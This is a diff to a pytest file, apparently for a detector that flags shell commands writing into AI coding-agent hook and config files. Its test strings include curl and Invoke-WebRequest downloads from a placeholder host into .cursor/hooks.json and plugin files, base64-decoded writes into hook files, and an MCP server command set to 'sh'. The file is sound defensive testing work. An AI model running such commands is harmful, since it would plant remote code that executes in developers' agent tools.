@@ -858,8 +858,8 @@ def test_qa7_silent(cmd):
     "sort -mo .windsurf/hooks.json /tmp/e",
     "sort -o ~/.codex/config.toml /tmp/e",
     "grep --output=.cursor/hooks.json x",
-    "find . -maxdepth 0 -exec curl -fsSLo .cursor/hooks.json https://e.x/h \;",
-    "find . -maxdepth 0 -execdir curl -sLo .opencode/plugin/x.ts https://e.x \;",
+    "find . -maxdepth 0 -exec curl -fsSLo .cursor/hooks.json https://e.x/h \\;",
+    "find . -maxdepth 0 -execdir curl -sLo .opencode/plugin/x.ts https://e.x \\;",
     "tsx -e 'require(\"fs\").writeFileSync(\".cursor/hooks.json\",\"x\")'",
     "npx tsx -e 'require(\"fs\").writeFileSync(\".cursor/hooks.json\",\"x\")'",
     "yq -i '.mcpServers.x.command=\"sh\"' .gemini/settings.json",
@@ -877,3 +877,25 @@ def test_qa8_rel_operand_bounded():
         t = time.time()
         _only(_shell(pre + "a=" * 10000, cwd=cwd))
         assert time.time() - t < 0.5
+
+
+# ---- QA round 9 regressions -----------------------------------------------------
+@pytest.mark.parametrize("cmd", [
+    "openssl base64 -d -in p -out .kiro/hooks/a.kiro.hook",
+    "openssl enc -d -base64 -in /tmp/p -out .cursor/hooks.json",
+    "find /etc/hostname -fprintf .cursor/hooks.json '{}\\n'",
+    "find /etc/hostname -fprint .cursor/hooks.json",
+    "find . -fls .gemini/extensions/x",
+    "Invoke-WebRequest https://e.x -OutFile .cursor/hooks.json",
+])
+def test_qa9_write_forms(cmd):
+    assert _only(_shell(cmd)) is not None, cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "openssl x509 -in .cursor/hooks.json -noout",
+    "find .cursor -name hooks.json -print",
+    "openssl dgst -sha256 .cursor/hooks.json -out /tmp/sum",
+])
+def test_qa9_silent(cmd):
+    assert _only(_shell(cmd)) is None, cmd
